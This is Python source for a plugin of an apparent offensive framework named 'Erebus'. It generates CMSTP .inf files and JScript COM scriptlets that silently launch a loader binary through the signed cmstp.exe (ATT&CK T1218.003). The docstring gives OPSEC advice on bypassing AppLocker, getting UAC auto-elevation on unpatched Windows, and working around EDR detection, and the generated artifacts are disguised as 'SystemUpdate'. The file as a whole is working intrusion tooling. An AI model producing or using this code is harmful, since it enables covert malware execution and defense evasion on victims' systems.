"""
CMSTP trigger plugin (T1218.003).

Produces a Windows Setup Information (.inf) file that runs the loader binary via
CMSTP's RunPreSetupCommandsSection. Invocation:
    cmstp.exe /s /ns payload.inf

OPSEC notes:
  - cmstp.exe is a signed Microsoft binary; proxy execution bypasses AppLocker
    default rules that block unsigned binaries.
  - On older Windows (pre-patch MS16-075) CMSTP /au enables UAC auto-elevation.
  - cmstp.exe spawning a child process is a well-known detection signal in modern
    EDR rules (Sigma: proc_creation_win_cmstp_execution_*.yml).
  - Use the SCT variant (RegisterOCXSection) for COM scriptlet delivery when the
    target environment restricts direct binary execution from .inf.
"""

import os
import uuid
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="CMSTP Trigger",
        description="Produces a .inf file for CMSTP proxy execution (T1218.003)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        supported_os=["Windows"],
    )
)


_INF_TEMPLATE = """\
[Version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
{loader_cmd}
taskkill /f /im cmstp.exe /t >nul 2>&1

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7

[AllUSer_LDIDSection]
"HKLM","SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE","ProfileInstallPath",0x2,"%%SystemRoot%%\\Pchealth"

[Strings]
ServiceName="SystemUpdate"
ShortSvcName="SystemUpdate"
"""

_SCT_TEMPLATE = """\
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="SystemUpdate"
    classid="{{{classid}}}">
<script language="JScript">
<![CDATA[
  var oShell = new ActiveXObject("WScript.Shell");
  oShell.Run("{loader_cmd}", 0, false);
]]>
</script>
</registration>
</scriptlet>
"""

_INF_SCT_TEMPLATE = """\
[Version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
RegisterOCXSection=RegOCXSection

[RegOCXSection]
{sct_path}

[Strings]
ServiceName="SystemUpdate"
ShortSvcName="SystemUpdate"
"""


def create_cmstp_trigger(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate CMSTP .inf trigger artifacts.

    Args:
        payload_path: Full path to the loader binary on the target system.
        output_dir:   Directory where output files are written.
        **kwargs:
            sct_mode (bool): If True, produce an SCT COM scriptlet variant and a
                             matching .inf that calls RegisterOCXSection instead of
                             RunPreSetupCommands. Default: False.
            sct_path (str):  Path to the .sct on the target when sct_mode=True.
                             Defaults to same directory as payload + "update.sct".

    Returns:
        dict with keys:
            inf_path  - absolute path to the generated .inf file
            sct_path  - absolute path to the .sct (only when sct_mode=True)
            run_cmd   - command line the operator should execute on the target
    """
    os.makedirs(output_dir, exist_ok=True)

    sct_mode: bool = bool(kwargs.get("sct_mode", False))

    inf_filename = "SystemUpdate.inf"
    inf_path = os.path.join(output_dir, inf_filename)

    if sct_mode:
        classid = str(uuid.uuid4()).upper()
        sct_filename = "update.sct"
        sct_path_target: str = kwargs.get(
            "sct_path",
            os.path.join(os.path.dirname(payload_path), sct_filename),
        )
        sct_out = os.path.join(output_dir, sct_filename)

        sct_content = _SCT_TEMPLATE.format(
            classid=classid,
            loader_cmd=payload_path.replace("\\", "\\\\"),
        )
        with open(sct_out, "w", encoding="utf-8") as fh:
            fh.write(sct_content)

        inf_content = _INF_SCT_TEMPLATE.format(
            sct_path=sct_path_target,
        )
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(inf_content)

        return {
            "inf_path": inf_path,
            "sct_path": sct_out,
            "run_cmd": f"cmstp.exe /s /ns {inf_filename}",
        }

    inf_content = _INF_TEMPLATE.format(loader_cmd=payload_path)
    with open(inf_path, "w", encoding="utf-8") as fh:
        fh.write(inf_content)

    return {
        "inf_path": inf_path,
        "sct_path": None,
        "run_cmd": f"cmstp.exe /s /ns {inf_filename}",
    }


def register():
    _plugin.register_function("create_cmstp_trigger", create_cmstp_trigger)
    return _plugin


def on_load():
    return register()
